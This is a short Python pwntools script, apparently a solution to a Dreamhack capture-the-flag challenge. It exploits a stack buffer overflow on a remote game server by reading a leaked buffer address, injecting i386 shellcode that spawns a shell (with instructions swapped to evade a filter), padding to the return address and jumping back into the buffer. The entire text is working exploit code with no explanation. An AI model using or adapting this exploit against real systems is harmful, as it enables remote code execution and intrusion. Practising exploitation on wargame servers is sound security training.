from pwn import *

proc = remote("host1.dreamhack.games", 10958)

proc.recvuntil(b"(")
buf = int(proc.recvuntil(b")")[2:-1].decode(), 16)

shellcode = shellcraft.i386.linux.sh()
shellcode = shellcode.replace("push SYS_execve", "mov eax, 0x05")
shellcode = shellcode.replace("pop eax", "add eax, 0x06")
shellcode = asm(shellcode)

payload  = shellcode
payload += b"A"*(0x84-len(shellcode))
payload += p32(buf)

proc.sendline(payload)
proc.interactive()
